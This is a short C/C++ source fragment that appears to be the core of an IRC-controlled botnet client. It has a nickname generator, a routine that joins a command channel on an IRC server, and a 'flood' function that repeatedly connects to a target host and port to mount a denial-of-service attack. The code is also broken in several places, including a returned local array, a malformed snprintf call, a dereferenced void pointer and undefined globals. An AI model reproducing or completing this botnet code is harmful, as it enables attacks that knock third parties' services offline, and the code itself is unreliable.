#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <cstdlib>
#include <stdlib.h>

char* generateNick(){
    char nick[9] = "troop# ";
    *(nick + 8) = rand()%30;
    return nick;
}

int ircConnect(){

    char buf[MAX_LINE_SIZE];
    struct sockaddr_in addr;

    if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        printf("Could not create socket\n");
        return -1;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERV_PORT);
    addr.sin_addr.s_addr = inet_addr(SERV_ADDR);

    if(connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0){
        printf("Could not connect to %s:%d\n", SERV_ADDR, SERV_PORT);
        return -1;
    }

    snprintf(buf, "%s %s\r\n", "NICK", nick);

    if(send(sock, buf, strlen(buf), 0) < 0){
        printf("Could not send NICK\n");
        return -1;
    }

    snprintf(buf, sizeof(buf), "%s %s\r\n", "JOIN", CHAN);

    if(send(sock, buf, strlen(buf), 0) < 0){
        printf("Could not send JOIN\n");
        return -1;
    }

    else{
        printf("Joined channel %s\n", CHAN);
        memset(buf, 0, sizeof(buf));
    }

    return 1;
}

void flood(void *args){

	int fsock = 0;

	char buf[MAX_LINE_SIZE];
	struct sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(args->port);
	addr.sin_addr.s_addr = inet_addr(args->addr);

	fsock = socket(AF_INET, SOCK_STREAM, 0);
	connect(fsock, (struct sockaddr*)&addr, sizeof(addr));

	memset(buf, 0, sizeof(buf));

	while(1){
		connect(fsock, (struct sockaddr*)&addr, sizeof(addr));
		send(fsock, buf, strlen(buf));
	}
}
